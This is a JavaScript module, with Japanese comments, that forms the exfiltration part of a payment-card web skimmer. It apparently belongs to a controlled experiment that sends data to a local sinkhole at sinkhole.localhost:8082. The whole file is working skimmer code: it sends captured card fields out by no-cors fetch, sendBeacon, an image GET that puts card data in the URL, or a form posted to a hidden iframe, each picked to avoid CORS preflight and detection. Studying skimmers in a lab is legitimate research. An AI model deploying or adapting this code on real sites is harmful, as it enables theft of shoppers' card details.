'use strict';
// スキマーの送信部（全モデル共通。D23）。
// 宛先: sinkhole.localhost:8082（D29、D54）。符号化なし（D30）。全送信は preflight の起きない単純リクエスト（D54）。
// 送信手段: 既定は fetch の no-cors（D54）。追加実験（D57、experiment_spec.md §14）では、この script の src の
// クエリ `t` で切り替える: B = sendBeacon、G = 画像GET、F = 隠しiFrame宛ての form.submit。指定なし・不正な値は fetch。
// XHR への切り替えは D28・D38 により、今は実装しない。
(function () {
  var SINK_URL = 'http://sinkhole.localhost:8082/c';

  var transport = 'fetch';
  try {
    var t = new URL(document.currentScript.src).searchParams.get('t');
    if (t === 'B' || t === 'G' || t === 'F') transport = t;
  } catch (e) { /* 指定なしと同じ（fetch） */ }

  function toParams(pairs) {
    // pairs: [[name, value], ...]。URLSearchParams の本文は application/x-www-form-urlencoded になる
    var p = new URLSearchParams();
    pairs.forEach(function (x) { p.append(x[0], x[1]); });
    return p;
  }

  function viaFetch(pairs) {
    return fetch(SINK_URL, { method: 'POST', mode: 'no-cors', body: toParams(pairs) });
  }

  function viaBeacon(pairs) {
    return navigator.sendBeacon(SINK_URL, toParams(pairs));
  }

  // 画像GET: カード情報は URL のクエリに入る。応答は画像でなくてよい（リクエストが出れば足りる）
  function viaImage(pairs) {
    var img = new Image();
    img.src = SINK_URL + '?' + toParams(pairs).toString();
    return img;
  }

  // form.submit: 隠し iFrame を宛先にした POST。form.submit() は submit イベントを起こさないので、
  // 取得部（submit イベントで読む）が、この送信を再び取得する循環は起きない
  function viaForm(pairs) {
    var name = 'sk' + Math.random().toString(36).slice(2, 8);
    var frame = document.createElement('iframe');
    frame.name = name;
    frame.style.display = 'none';
    document.body.appendChild(frame);
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = SINK_URL;
    form.target = name;
    form.style.display = 'none';
    pairs.forEach(function (x) {
      var input = document.createElement('input');
      input.type = 'hidden';
      input.name = x[0];
      input.value = x[1];
      form.appendChild(input);
    });
    document.body.appendChild(form);
    form.submit();
    return form;
  }

  var SENDERS = { fetch: viaFetch, B: viaBeacon, G: viaImage, F: viaForm };
  window.__skimmerSend = function (pairs) { return SENDERS[transport](pairs); };
  window.__skimmerTransport = transport; // 確認用（試行の記録・テストで使う）
})();
